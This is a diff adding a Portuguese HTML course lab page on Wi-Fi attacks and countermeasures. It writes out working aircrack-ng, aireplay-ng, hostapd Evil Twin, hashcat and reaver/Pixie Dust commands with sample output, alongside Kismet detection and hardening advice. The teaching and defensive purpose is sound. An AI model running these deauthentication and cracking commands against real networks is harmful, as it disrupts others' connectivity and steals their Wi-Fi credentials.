@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="author" content="Prof. Dr. Laerte Peotta de Melo">
+<title>Lab 04 — Ataques e Contramedidas | Prof. Dr. Laerte Peotta de Melo</title>
+<style>  :root{
+    --bg:#010503;--bg2:#031208;--panel:rgba(3,18,9,.82);--panel2:rgba(5,28,13,.72);
+    --line:rgba(62,255,132,.22);--line2:rgba(62,255,132,.10);--text:#dcffe8;
+    --muted:#9fd4b4;--green:#39ff7a;--green2:#00d26a;--amber:#ffd166;
+    --red:#ff6b6b;--blue:#64d2ff;
+    --shadow:0 24px 80px rgba(0,0,0,.55),0 0 38px rgba(57,255,122,.08);
+    --radius:22px;--max:1180px;
+  }
+  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+  html{scroll-behavior:smooth;}
+  body{min-height:100vh;font-family:Inter,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono",monospace;font-size:16px;line-height:1.75;color:var(--text);background:radial-gradient(circle at 18% 0%,rgba(57,255,122,.16),transparent 27%),radial-gradient(circle at 90% 12%,rgba(0,210,106,.11),transparent 24%),linear-gradient(180deg,#010201 0%,#020704 45%,#031008 100%);overflow-x:hidden;}
+  body::before{content:"";position:fixed;inset:0;background-image:linear-gradient(rgba(57,255,122,.045) 1px,transparent 1px),linear-gradient(90deg,rgba(57,255,122,.045) 1px,transparent 1px);background-size:32px 32px;pointer-events:none;z-index:-2;}
+  body::after{content:"";position:fixed;inset:0;background:linear-gradient(180deg,rgba(0,0,0,.18),rgba(0,0,0,.58));pointer-events:none;z-index:-1;}
+  #matrix-rain{position:fixed;inset:0;width:100%;height:100%;pointer-events:none;z-index:-3;opacity:.62;}
+  a{color:var(--green);text-decoration:none;}
+  a:hover{color:#fff;text-shadow:0 0 10px rgba(57,255,122,.75);}
+  nav{position:sticky;top:0;z-index:100;width:min(calc(100% - 2rem),var(--max));margin:1rem auto 0;padding:.75rem .9rem;display:flex;align-items:center;gap:.8rem;flex-wrap:wrap;background:rgba(2,12,6,.82);border:1px solid var(--line);border-radius:999px;box-shadow:0 16px 45px rgba(0,0,0,.34),inset 0 0 24px rgba(57,255,122,.035);backdrop-filter:blur(16px);}
+  .nav-brand{margin-right:auto;white-space:nowrap;font-size:.82rem;font-weight:900;letter-spacing:.07em;text-transform:uppercase;color:#eafff0;text-shadow:0 0 12px rgba(57,255,122,.3);}
+  .nav-brand span{display:inline;margin-left:.5rem;color:var(--muted);font-weight:600;}
+  nav a{font-size:.78rem;font-weight:800;color:var(--muted);padding:.45rem .72rem;border-radius:999px;border:1px solid transparent;letter-spacing:.05em;text-transform:uppercase;}
+  nav a:hover{color:#051007;background:linear-gradient(135deg,var(--green),var(--green2));border-color:rgba(255,255,255,.14);text-shadow:none;}
+  .hero{width:min(calc(100% - 2rem),var(--max));margin:1.4rem auto 0;padding:2.25rem;background:linear-gradient(180deg,rgba(4,21,10,.92),rgba(3,15,8,.84));border:1px solid var(--line);border-radius:28px;box-shadow:var(--shadow);position:relative;overflow:hidden;}
+  .hero::before,.container::before{content:"● ● ●";position:absolute;top:.75rem;left:1.1rem;color:var(--green);font-size:.78rem;letter-spacing:.45rem;opacity:.85;}
+  .hero::after{content:"";position:absolute;inset:0;background:repeating-linear-gradient(0deg,rgba(57,255,122,.018) 0 1px,transparent 1px 4px),linear-gradient(90deg,rgba(57,255,122,.07),transparent 45%,rgba(57,255,122,.04));pointer-events:none;}
+  .hero>*{position:relative;z-index:1;}
+  .hero-meta{display:inline-flex;align-items:center;gap:.5rem;margin:.2rem 0 1rem;padding:.45rem .75rem;border-radius:999px;border:1px solid rgba(57,255,122,.26);background:rgba(57,255,122,.08);color:#eafff0;font-size:.78rem;font-weight:800;text-transform:uppercase;letter-spacing:.08em;}
+  .hero h1{max-width:980px;margin:0 0 1rem;font-size:clamp(2rem,5vw,4.4rem);line-height:1.05;letter-spacing:-.04em;color:#ecfff1;text-shadow:0 0 24px rgba(57,255,122,.18);}
+  .hero p{max-width:920px;margin:0 0 1.2rem;color:var(--muted);font-size:1rem;}
+  .hero strong{color:#eafff0;}
+  .badge-row{display:flex;gap:.55rem;flex-wrap:wrap;align-items:center;}
+  .badge{display:inline-flex;align-items:center;gap:.4rem;padding:.38rem .75rem;border-radius:999px;font-size:.75rem;font-weight:900;letter-spacing:.045em;text-transform:uppercase;border:1px solid var(--line);background:rgba(57,255,122,.08);color:#dfffe9;}
+  .badge::before{content:"▸";color:var(--green);}
+  .badge-blue{color:#d9f7ff;border-color:rgba(100,210,255,.28);background:rgba(100,210,255,.08);}
+  .badge-green{color:#e4ffe9;border-color:rgba(57,255,122,.28);background:rgba(57,255,122,.10);}
+  .badge-gray{color:var(--muted);border-color:rgba(216,255,231,.18);background:rgba(216,255,231,.045);}
+  .badge-red{color:#ffe4e4;border-color:rgba(255,107,107,.34);background:rgba(255,107,107,.10);}
+  .badge-orange{color:#fff2d0;border-color:rgba(255,209,102,.34);background:rgba(255,209,102,.10);}
+  .stats{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:1rem;margin:1.65rem 0 0;}
+  .stat{min-height:110px;padding:1rem;border-radius:18px;background:rgba(2,14,7,.78);border:1px solid var(--line2);box-shadow:inset 0 0 24px rgba(57,255,122,.035);}
+  .stat-val{font-size:clamp(1.35rem,3vw,2rem);line-height:1.1;color:#eafff0;font-weight:950;text-shadow:0 0 14px rgba(57,255,122,.2);}
+  .stat-lbl{margin-top:.38rem;color:var(--muted);font-size:.78rem;font-weight:700;}
+  .container{width:min(calc(100% - 2rem),var(--max));max-width:var(--max);margin:1.25rem auto 4rem;padding:2.1rem;background:rgba(2,12,6,.72);border:1px solid rgba(57,255,122,.16);border-radius:28px;box-shadow:var(--shadow);position:relative;backdrop-filter:blur(7px);overflow:hidden;}
+  .aviso{margin:1rem 0 1.4rem;padding:1rem 1.15rem;border-radius:18px;background:rgba(255,209,102,.10);border:1px solid rgba(255,209,102,.34);border-left:4px solid var(--amber);color:#fff1c9;font-size:.92rem;}
+  .sumario{margin:1.4rem 0 2.5rem;padding:1.25rem;border-radius:22px;background:rgba(4,22,10,.78);border:1px solid var(--line);}
+  .sumario h2{margin:0 0 .9rem;color:#eafff0;font-size:1rem;letter-spacing:.08em;text-transform:uppercase;}
+  .sumario ol{list-style:none;padding:0;display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:.75rem;}
+  .sumario li{line-height:1.35;}
+  .sumario a{display:block;min-height:54px;padding:.75rem .85rem;border-radius:16px;border:1px solid rgba(57,255,122,.12);background:rgba(216,255,231,.035);color:var(--muted);font-weight:800;font-size:.84rem;}
+  .sumario a:hover{color:#041108;background:linear-gradient(135deg,var(--green),var(--green2));text-shadow:none;}
+  section{margin-top:2.3rem;padding:1.3rem;border:1px solid rgba(57,255,122,.13);border-radius:24px;background:rgba(4,18,9,.58);box-shadow:inset 0 0 24px rgba(57,255,122,.025);}
+  section h2{display:flex;align-items:center;gap:.65rem;margin:0 0 1rem;padding-bottom:.75rem;border-bottom:1px solid rgba(57,255,122,.18);color:#eafff0;font-size:clamp(1.35rem,2.6vw,2rem);letter-spacing:-.02em;text-transform:uppercase;}
+  section h2::before{content:"▣";color:var(--green);text-shadow:0 0 12px rgba(57,255,122,.75);}
+  section h3{margin:1.4rem 0 .55rem;color:#eafff0;font-size:1.06rem;letter-spacing:.02em;}
+  section h3::before{content:"$ ";color:var(--green);}
+  section h4{margin:1rem 0 .4rem;color:#d5ffe1;font-size:.96rem;}
+  section p{margin:0 0 .75rem;color:#bfe8cd;font-size:.96rem;}
+  .table-wrap{overflow-x:auto;margin:1rem 0;border:1px solid rgba(57,255,122,.16);border-radius:16px;}
+  table{width:100%;border-collapse:collapse;font-size:.88rem;min-width:640px;}
+  th{background:rgba(57,255,122,.10);color:#eafff0;text-align:left;padding:.8rem .9rem;border-bottom:1px solid rgba(57,255,122,.16);font-weight:900;text-transform:uppercase;letter-spacing:.04em;}
+  td{padding:.78rem .9rem;color:#bfe8cd;vertical-align:top;border-bottom:1px solid rgba(57,255,122,.08);}
+  tr:nth-child(even) td{background:rgba(216,255,231,.025);}
+  tr:hover td{background:rgba(57,255,122,.045);}
+  pre{position:relative;overflow-x:auto;margin:.85rem 0 1.1rem;padding:2.3rem 1rem 1rem;border-radius:18px;background:rgba(0,8,3,.92);border:1px solid rgba(57,255,122,.22);box-shadow:inset 0 0 30px rgba(57,255,122,.045),0 16px 44px rgba(0,0,0,.22);}
+  pre::before{content:"terminal";position:absolute;top:.75rem;left:1rem;color:var(--green);font-size:.72rem;font-weight:900;letter-spacing:.12em;text-transform:uppercase;}
+  pre::after{content:"● ● ●";position:absolute;top:.72rem;right:1rem;color:rgba(57,255,122,.75);font-size:.72rem;letter-spacing:.28rem;}
+  code{font-family:'SFMono-Regular',Consolas,'Liberation Mono',Menlo,monospace;font-size:.84rem;color:#eafff0;line-height:1.65;}
+  .cm{color:#7cae8e;}.ck{color:#ff7b72;}.cv{color:#79c0ff;}.cs{color:#6dff9f;}.cw{color:#ffd166;}
+  p code,li code,td code{display:inline-block;padding:.08rem .38rem;border-radius:7px;border:1px solid rgba(57,255,122,.14);background:rgba(0,8,3,.64);color:#dfffe9;font-size:.82rem;}
+  ul.lista,ol.lista{padding-left:1.25rem;margin:.5rem 0 1rem;}
+  ul.lista li,ol.lista li{color:#bfe8cd;margin:.25rem 0;}
+  ul.check{list-style:none;padding:0;margin:.85rem 0 1rem;display:grid;gap:.6rem;}
+  ul.check li{display:flex;gap:.65rem;align-items:flex-start;padding:.75rem .85rem;border-radius:15px;background:rgba(216,255,231,.035);border:1px solid rgba(57,255,122,.10);color:#c9f4d7;font-size:.92rem;}
+  ul.check li .ok{color:var(--green);font-weight:900;}
+  ul.check li .nao{color:var(--red);font-weight:900;}
+  .link-grid{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:1rem;margin:1rem 0;}
+  .link-card{min-height:170px;padding:1rem;display:flex;flex-direction:column;gap:.4rem;border-radius:20px;background:rgba(2,14,7,.72);border:1px solid rgba(57,255,122,.14);transition:transform .2s ease,border-color .2s ease,box-shadow .2s ease;}
+  .link-card:hover{transform:translateY(-3px);border-color:rgba(57,255,122,.36);box-shadow:0 18px 44px rgba(0,0,0,.28),0 0 24px rgba(57,255,122,.08);}
+  .link-card .lc-label{font-size:.7rem;font-weight:900;color:var(--green);letter-spacing:.1em;text-transform:uppercase;}
+  .link-card .lc-title{color:#eafff0;font-size:.96rem;font-weight:900;}
+  .link-card .lc-desc{flex:1;color:var(--muted);font-size:.84rem;}
+  .link-card a.lc-link{margin-top:.4rem;font-size:.82rem;font-weight:900;color:#041108;background:linear-gradient(135deg,var(--green),var(--green2));padding:.55rem .7rem;border-radius:999px;text-align:center;}
+  .flow{display:flex;align-items:center;gap:.55rem;flex-wrap:wrap;margin:1rem 0;padding:1rem;border-radius:18px;background:rgba(0,8,3,.5);border:1px solid rgba(57,255,122,.14);}
+  .flow-step{padding:.55rem .85rem;border-radius:999px;background:rgba(57,255,122,.09);border:1px solid rgba(57,255,122,.20);color:#eafff0;font-size:.84rem;font-family:'SFMono-Regular',Consolas,monospace;font-weight:900;}
+  .flow-arr{color:var(--green);font-size:1.1rem;}
+  footer{width:min(calc(100% - 2rem),var(--max));margin:0 auto 2rem;padding:1.2rem;border:1px solid rgba(57,255,122,.13);border-radius:20px;background:rgba(2,12,6,.72);color:var(--muted);text-align:center;font-size:.84rem;}
+  @media(max-width:980px){nav{border-radius:24px;}.nav-brand{width:100%;white-space:normal;}.nav-brand span{display:block;margin:.2rem 0 0;}.stats{grid-template-columns:repeat(2,minmax(0,1fr));}.sumario ol{grid-template-columns:repeat(2,minmax(0,1fr));}.link-grid{grid-template-columns:repeat(2,minmax(0,1fr));}}
+  @media(max-width:640px){body{font-size:15px;}nav,.hero,.container,footer{width:min(calc(100% - 1rem),var(--max));}.hero,.container{padding:1.25rem;border-radius:22px;}.hero h1{font-size:2rem;}.stats,.sumario ol,.link-grid{grid-template-columns:1fr;}nav a{flex:1 1 auto;text-align:center;}}</style>
+</head>
+<body>
+<canvas id="matrix-rain" aria-hidden="true"></canvas>
+<nav>
+  <div class="nav-brand">Prof. Dr. Laerte Peotta de Melo <span>Professor • Pesquisador • Segurança Cibernética • Redes</span></div>
+  <a href="index.html">← Todos os Labs</a>
+  <a href="#objetivo">Objetivo</a>
+  <a href="#deauth">DeAuth</a>
+  <a href="#eviltwin">Evil Twin</a>
+  <a href="#wps">WPS</a>
+  <a href="#contramedidas">Contramedidas</a>
+  <a href="#atividades">Atividades</a>
+</nav>
+
+<div class="hero">
+  <div class="hero-meta">⚔ Laboratório 04 · Ataques e Contramedidas</div>
+  <h1>Ataques a Redes Wi-Fi e Contramedidas</h1>
+  <p>Demonstração em ambiente isolado e autorizado dos principais vetores de ataque: desautenticação (DeAuth), Evil Twin / Rogue AP, captura de handshake WPA2 e ataque ao WPS PIN. Análise de impacto e contramedidas para cada vetor.</p>
+  <div class="badge-row">
+    <span class="badge badge-blue">DeAuth · 802.11w</span>
+    <span class="badge badge-blue">Evil Twin · Rogue AP</span>
+    <span class="badge badge-blue">WPS PIN · Pixie Dust</span>
+    <span class="badge badge-green">Contramedidas práticas</span>
+    <span class="badge badge-red">Somente rede própria/autorizada</span>
+  </div>
+  <div class="stats">
+    <div class="stat"><div class="stat-val">4</div><div class="stat-lbl">Vetores de ataque</div></div>
+    <div class="stat"><div class="stat-val">11k</div><div class="stat-lbl">Tentativas máx. WPS</div></div>
+    <div class="stat"><div class="stat-val">PMF</div><div class="stat-lbl">Proteção contra DeAuth</div></div>
+    <div class="stat"><div class="stat-val">WPA3</div><div class="stat-lbl">Contramedida recomendada</div></div>
+  </div>
+</div>
+
+<div class="container">
+  <div class="aviso">⚠️ <strong>Aviso legal.</strong> Execute <strong>somente em ambiente de laboratório isolado</strong>, em redes próprias e com autorização explícita. Ataques a redes de terceiros são crime — <strong>Lei 12.737/2012</strong> e <strong>Lei 12.965/2014</strong>. Nunca aplique estas técnicas fora do contexto educacional autorizado.</div>
+
+  <div class="sumario">
+    <h2>Sumário</h2>
+    <ol>
+      <li><a href="#objetivo">Objetivo e ambiente</a></li>
+      <li><a href="#deauth">Ataque DeAuth — desautenticação</a></li>
+      <li><a href="#eviltwin">Evil Twin — Rogue AP</a></li>
+      <li><a href="#handshake">Captura forçada de handshake</a></li>
+      <li><a href="#wps">Ataque WPS PIN</a></li>
+      <li><a href="#contramedidas">Contramedidas e hardening</a></li>
+      <li><a href="#atividades">Atividades avaliativas</a></li>
+    </ol>
+  </div>
+
+  <section id="objetivo">
+    <h2>1. Objetivo e ambiente do laboratório</h2>
+    <p>Este laboratório demonstra ataques a redes Wi-Fi em um ambiente <strong>completamente isolado</strong>. O AP de laboratório não deve ter conectividade com a Internet nem com redes institucionais. Clientes são notebooks ou smartphones exclusivos para o laboratório.</p>
+    <h3>Topologia do ambiente</h3>
+    <div class="table-wrap"><table>
+      <tr><th>Componente</th><th>Configuração</th><th>Papel</th></tr>
+      <tr><td>Access Point de laboratório</td><td>Mercusys MR30G / TP-Link Archer C6</td><td>Alvo dos testes — rede isolada sem Internet</td></tr>
+      <tr><td>Máquina do atacante</td><td>Kali Linux + adaptador Alfa AWUS036ACH</td><td>Executa as ferramentas de auditoria</td></tr>
+      <tr><td>Cliente legítimo</td><td>Smartphone Android / notebook</td><td>Simula usuário conectado ao AP</td></tr>
+      <tr><td>SSID de laboratório</td><td>Lab-WiFi-Seguro / senha: LabSenha2024!</td><td>Rede de teste com credenciais conhecidas</td></tr>
+    </table></div>
+    <div class="aviso" style="margin-top:1rem">Antes de iniciar: confirme que o AP não tem rota para a Internet. Use um switch/roteador separado e uma faixa de IP dedicada (ex.: 192.168.99.0/24).</div>
+  </section>
+
+  <section id="deauth">
+    <h2>2. Ataque DeAuth — Desautenticação</h2>
+    <p>O ataque de desautenticação explora o fato de que, sem PMF (802.11w), frames de gerenciamento não são autenticados. Um atacante pode enviar frames Deauthentication forjados com o endereço MAC do AP, forçando a desconexão de clientes.</p>
+    <h3>Mecanismo do ataque</h3>
+    <div class="flow">
+      <div class="flow-step">Capturar BSSID e MAC do cliente</div>
+      <div class="flow-arr">→</div>
+      <div class="flow-step">Forjar frame DeAuth (src=AP)</div>
+      <div class="flow-arr">→</div>
+      <div class="flow-step">Injetar no canal do AP</div>
+      <div class="flow-arr">→</div>
+      <div class="flow-step">Cliente desconecta</div>
+      <div class="flow-arr">→</div>
+      <div class="flow-step">Capturar handshake na reconexão</div>
+    </div>
+    <h3>Execução no ambiente de laboratório</h3>
+    <pre><code><span class="cm"># Passo 1: identificar AP e cliente com airodump-ng</span>
+airodump-ng wlan0mon -c 6 --bssid AA:BB:CC:11:22:33
+
+<span class="cs"> BSSID              CH  ENC   ESSID
+ AA:BB:CC:11:22:33   6  WPA2  Lab-WiFi-Seguro
+
+ STATION            PWR  ESSID
+ DD:EE:FF:00:11:22  -48  Lab-WiFi-Seguro  ← cliente conectado</span>
+
+<span class="cm"># Passo 2: capturar handshake em segundo terminal</span>
+airodump-ng -c 6 --bssid AA:BB:CC:11:22:33 -w handshake wlan0mon
+
+<span class="cm"># Passo 3: enviar 5 frames de DeAuth</span>
+aireplay-ng -0 5   -a AA:BB:CC:11:22:33   -c DD:EE:FF:00:11:22   wlan0mon
+
+<span class="cw">Sending 5 directed DeAuth frames...
+DeAuth frame 1/5 sent
+DeAuth frame 2/5 sent
+DeAuth frame 3/5 sent</span>
+<span class="cs">WPA handshake: AA:BB:CC:11:22:33  ← handshake capturado na reconexão</span>
+
+<span class="cm"># DeAuth broadcast (desconecta TODOS os clientes)</span>
+aireplay-ng -0 5 -a AA:BB:CC:11:22:33 wlan0mon</code></pre>
+    <h3>Detectar DeAuth com Kismet</h3>
+    <pre><code><span class="cm"># Kismet alerta automaticamente sobre flood de DeAuth</span>
+kismet -c wlan0 --alert DEAUTHFLOOD,5,1
+
+<span class="cw">[ALERT] DEAUTHFLOOD: 5 DeAuth frames em 1s — possível ataque</span>
+
+<span class="cm"># Via Wireshark — filtrar frames DeAuth</span>
+wlan.fc.type_subtype == 12
+
+<span class="cm"># Contar DeAuth por origem</span>
+tshark -r captura.pcap -Y "wlan.fc.type_subtype==12"   -T fields -e wlan.sa | sort | uniq -c | sort -rn</code></pre>
+    <h3>Contramedida: PMF (802.11w)</h3>
+    <pre><code><span class="cm"># /etc/hostapd/hostapd.conf — habilitar PMF obrigatório</span>
+<span class="cv">ieee80211w=2</span>   <span class="cm"># 2 = obrigatório (Management Frame Protection Required)</span>
+
+<span class="cs"># Resultado com PMF ativo:</span>
+aireplay-ng -0 5 -a AA:BB:CC:11:22:33 -c DD:EE:FF:00:11:22 wlan0mon
+<span class="cw">Error: send_deauth — No response. PMF ativo: ataque ineficaz.</span></code></pre>
+  </section>
+
+  <section id="eviltwin">
+    <h2>3. Evil Twin — Rogue AP</h2>
+    <p>O ataque Evil Twin cria um AP falso com o mesmo SSID do AP legítimo, em geral com sinal mais forte. O objetivo é fazer o cliente se conectar ao AP falso, permitindo interceptação do tráfego (MITM).</p>
+    <h3>Criação de AP falso com hostapd</h3>
+    <pre><code><span class="cm"># Criar arquivo de configuração do AP falso</span>
+cat &gt; /tmp/evil_twin.conf &lt;&lt; 'EOF'
+interface=wlan1
+driver=nl80211
+ssid=Lab-WiFi-Seguro
+channel=6
+hw_mode=g
+auth_algs=1
+ignore_broadcast_ssid=0
+EOF
+
+<span class="cm"># Iniciar AP falso (requer segundo adaptador wlan1)</span>
+hostapd /tmp/evil_twin.conf
+
+<span class="cs">[hostapd] AP "Lab-WiFi-Seguro" iniciado no canal 6
+[hostapd] Aguardando conexões de clientes...</span>
+
+<span class="cm"># Observar clientes que se conectam ao AP falso</span>
+tail -f /var/log/hostapd.log</code></pre>
+    <h3>Detecção de Evil Twin</h3>
+    <pre><code><span class="cm"># Kismet detecta AP com SSID duplicado e BSSID diferente</span>
+kismet -c wlan0 --alert APSPOOF,10,60
+
+<span class="cw">[ALERT] APSPOOF: SSID "Lab-WiFi-Seguro" visto com BSSID diferente!
+        BSSID legítimo:  AA:BB:CC:11:22:33
+        BSSID suspeito:  FF:EE:DD:CC:BB:AA ← possível Evil Twin</span>
+
+<span class="cm"># Via airodump-ng: dois APs com mesmo SSID</span>
+<span class="cs"> BSSID              CH  ENC   ESSID
+ AA:BB:CC:11:22:33   6  WPA2  Lab-WiFi-Seguro  ← legítimo
+ FF:EE:DD:CC:BB:AA   6  OPN   Lab-WiFi-Seguro  ← FALSO (sem senha)</span></code></pre>
+  </section>
+
+  <section id="handshake">
+    <h2>4. Captura forçada de handshake WPA2</h2>
+    <pre><code><span class="cm"># Fluxo completo: captura + DeAuth + crack</span>
+
+<span class="cm"># Terminal 1: capturar handshake</span>
+airodump-ng -c 6 --bssid AA:BB:CC:11:22:33 -w handshake wlan0mon
+
+<span class="cm"># Terminal 2: forçar reconexão do cliente</span>
+aireplay-ng -0 3 -a AA:BB:CC:11:22:33 -c DD:EE:FF:00:11:22 wlan0mon
+<span class="cs">WPA handshake: AA:BB:CC:11:22:33  ← confirmado em Terminal 1</span>
+
+<span class="cm"># Verificar handshake capturado</span>
+aircrack-ng handshake-01.cap
+<span class="cs">  #  BSSID              ESSID                  ENC  Handshake
+  1  AA:BB:CC:11:22:33  Lab-WiFi-Seguro        WPA  1 handshake</span>
+
+<span class="cm"># Tentar crack com dicionário (senha do lab é conhecida)</span>
+aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap
+<span class="cw">Testando 14.341.564 chaves...</span>
+<span class="cs">KEY FOUND! [ LabSenha2024! ]
+Tempo: 8m 12s  |  Velocidade: 28.921 chaves/s</span>
+
+<span class="cm"># Alternativa mais rápida: hashcat com GPU</span>
+hcxtools -i handshake-01.cap -o hash.hc22000
+hashcat -m 22000 hash.hc22000 rockyou.txt
+<span class="cs">Session: Cracked — Velocidade: 2.1 MH/s (RTX 3080)</span></code></pre>
+  </section>
+
+  <section id="wps">
+    <h2>5. Ataque ao WPS PIN</h2>
+    <p>O WPS (Wi-Fi Protected Setup) permite configuração simplificada via PIN de 8 dígitos. A vulnerabilidade de design divide a verificação em duas metades de 4 dígitos, reduzindo o espaço de busca de 10<sup>8</sup> para 10<sup>4</sup> + 10<sup>3</sup> = 11.000 tentativas.</p>
+    <pre><code><span class="cm"># Verificar APs com WPS habilitado</span>
+wash -i wlan0mon --ignore-fcs
+
+<span class="cs"> BSSID              Ch  dBm  WPS  Lck  ESSID
+ AA:BB:CC:11:22:33   6  -55  2.0  No   Lab-WiFi-Seguro  ← vulnerável</span>
+
+<span class="cm"># Ataque brute-force do PIN (lento, ~2-10h)</span>
+reaver -i wlan0mon -b AA:BB:CC:11:22:33 -vv --delay 1
+
+<span class="cs">[+] Tentando PIN 12345670...
+[+] Tentando PIN 00005678...</span>
+<span class="cw">[!] Rate limiting detectado — delay aumentado para 5s</span>
+<span class="cs">[+] WPS PIN: '87654321'
+[+] WPA PSK: 'LabSenha2024!'</span>
+
+<span class="cm"># Pixie Dust — exploração offline de chips vulneráveis (segundos)</span>
+reaver -i wlan0mon -b AA:BB:CC:11:22:33 -vv -K 1
+
+<span class="cs">[Pixie-Dust] Nonces capturados — calculando chave offline...
+[Pixie-Dust] PIN recuperado em 38 segundos!</span>
+
+<span class="cm"># Contramedida imediata: desabilitar WPS no painel do roteador</span></code></pre>
+    <h3>Comparativo dos métodos de ataque ao WPS</h3>
+    <div class="table-wrap"><table>
+      <tr><th>Método</th><th>Tempo</th><th>Condição</th><th>Contramedida</th></tr>
+      <tr><td>Brute-force PIN</td><td>2–10 horas</td><td>WPS ativo, sem lockout</td><td>Lockout após 3 tentativas + desabilitar WPS</td></tr>
+      <tr><td>Pixie Dust</td><td>Segundos</td><td>Chip Ralink/Broadcom vulnerável</td><td>Atualizar firmware ou desabilitar WPS</td></tr>
+      <tr><td>PIN estático (padrão)</td><td>Minutos</td><td>PIN padrão do fabricante em uso</td><td>Desabilitar WPS — não existe outra solução eficaz</td></tr>
+    </table></div>
+  </section>
+
+  <section id="contramedidas">
+    <h2>6. Contramedidas e hardening</h2>
+    <ul class="check">
+      <li><span class="ok">✓</span><span><strong>Desabilitar WPS</strong> completamente no painel de administração do roteador — a única contramedida eficaz.</span></li>
+      <li><span class="ok">✓</span><span>Habilitar <strong>PMF obrigatório</strong> (ieee80211w=2) — elimina o ataque de DeAuth e protege frames de gerenciamento.</span></li>
+      <li><span class="ok">✓</span><span>Migrar para <strong>WPA3-SAE</strong> — elimina o crack offline de handshake e o ataque PMKID.</span></li>
+      <li><span class="ok">✓</span><span>Usar senha Wi-Fi com <strong>20+ caracteres</strong> aleatórios — torna o dicionário e brute-force computacionalmente inviáveis.</span></li>
+      <li><span class="ok">✓</span><span>Monitorar com <strong>Kismet como IDS</strong> — detecta DeAuth flood, Evil Twin e clientes não autorizados em tempo real.</span></li>
+      <li><span class="ok">✓</span><span>Atualizar <strong>firmware do roteador</strong> regularmente — corrige vulnerabilidades conhecidas no WPS e outros subsistemas.</span></li>
+      <li><span class="nao">✗</span><span>Não confiar em <strong>ocultação de SSID</strong> como segurança — o SSID aparece em probe requests e nas respostas de associação.</span></li>
+      <li><span class="nao">✗</span><span>Não usar <strong>MAC filtering</strong> como única proteção — MACs podem ser facilmente falsificados após observação passiva.</span></li>
+    </ul>
+    <h3>Gerar senha forte para o AP</h3>
+    <pre><code><span class="cm"># Gerar senha de 24 caracteres aleatórios</span>
+openssl rand -base64 24
+<span class="cs">K9mXpQ2vRw7nLsYdFhJcUbE4==</span>
+
+tr -dc 'A-Za-z0-9!@#$%^&*' &lt; /dev/urandom | head -c 24; echo
+<span class="cs">mK8!xR2@qP5#wL9%cD7^</span></code></pre>
+  </section>
+
+  <section id="atividades">
+    <h2>7. Atividades avaliativas</h2>
+    <ul class="check">
+      <li><span class="ok">①</span><span>Execute o ataque DeAuth no AP de laboratório (sem PMF). Capture o handshake WPA2 e confirme sua integridade com aircrack-ng. Documente o tempo entre o DeAuth e a captura do handshake.</span></li>
+      <li><span class="ok">②</span><span>Habilite PMF obrigatório no AP (ieee80211w=2). Repita o ataque DeAuth e documente o resultado. Compare com o comportamento sem PMF e explique o motivo da diferença.</span></li>
+      <li><span class="ok">③</span><span>Verifique se o AP de laboratório tem WPS habilitado com wash. Se sim, execute o Pixie Dust com reaver e documente: tempo de execução, PIN obtido e PSK recuperada.</span></li>
+      <li><span class="ok">④</span><span>Configure o Kismet como IDS e execute todos os ataques do laboratório. Verifique quais alertas foram gerados, o tempo de detecção e a precisão dos alertas.</span></li>
+      <li><span class="ok">⑤</span><span>Elabore um relatório de pentest simulado com: sumário executivo, vetores explorados, impacto de cada ataque e plano de remediação priorizado por criticidade.</span></li>
+    </ul>
+    <div class="link-grid">
+      <div class="link-card">
+        <div class="lc-label">Lab Anterior</div>
+        <div class="lc-title">Lab 03 — Protocolos WPA2/3</div>
+        <div class="lc-desc">Análise do 4-Way Handshake, SAE e PMKID.</div>
+        <a class="lc-link" href="lab03-protocolos.html">← Voltar</a>
+      </div>
+      <div class="link-card">
+        <div class="lc-label">Próximo Lab</div>
+        <div class="lc-title">Lab 05 — Ferramentas</div>
+        <div class="lc-desc">Referência completa: Kismet, Aircrack-ng, Reaver e Wifite.</div>
+        <a class="lc-link" href="lab05-ferramentas.html">Avançar →</a>
+      </div>
+      <div class="link-card">
+        <div class="lc-label">Norma</div>
+        <div class="lc-title">IEEE 802.11w — PMF</div>
+        <div class="lc-desc">Especificação do Protected Management Frames amendment.</div>
+        <a class="lc-link" href="https://standards.ieee.org/ieee/802.11w/4055/" target="_blank">ieee.org ↗</a>
+      </div>
+      <div class="link-card">
+        <div class="lc-label">Índice</div>
+        <div class="lc-title">Todos os laboratórios</div>
+        <div class="lc-desc">Retornar à página inicial da série de laboratórios.</div>
+        <a class="lc-link" href="index.html">← Índice</a>
+      </div>
+    </div>
+  </section>
+</div>
+<footer>Laboratório 04 · Prof. Dr. Laerte Peotta de Melo • <a href="https://peotta.github.io">peotta.github.io</a> • <a href="https://github.com/peotta/lab-wifi" target="_blank">github.com/peotta/lab-wifi ↗</a></footer>
+<script>(function(){const canvas=document.getElementById("matrix-rain");if(!canvas)return;const ctx=canvas.getContext("2d");const chars="01アイウエオカキクケコABCDEFGHIJKLMNOPQRSTUVWXYZ#$%&*+-/<>{}[]";let width,height,columns,drops,fontSize;function resize(){width=canvas.width=window.innerWidth;height=canvas.height=window.innerHeight;fontSize=Math.max(13,Math.floor(width/105));columns=Math.floor(width/fontSize);drops=Array.from({length:columns},()=>Math.floor(Math.random()*height/fontSize));ctx.font=fontSize+"px Consolas,monospace";}function draw(){ctx.fillStyle="rgba(1,5,3,0.105)";ctx.fillRect(0,0,width,height);ctx.font=fontSize+"px Consolas,monospace";for(let i=0;i<drops.length;i++){const text=chars.charAt(Math.floor(Math.random()*chars.length));const x=i*fontSize;const y=drops[i]*fontSize;ctx.fillStyle=Math.random()>.985?"rgba(220,255,232,.62)":"rgba(57,255,122,.32)";ctx.shadowColor="rgba(57,255,122,.22)";ctx.shadowBlur=7;ctx.fillText(text,x,y);ctx.shadowBlur=0;if(y>height&&Math.random()>.972)drops[i]=0;drops[i]+=1;}requestAnimationFrame(draw);}window.addEventListener("resize",resize);resize();draw();})();</script>
+</body></html>
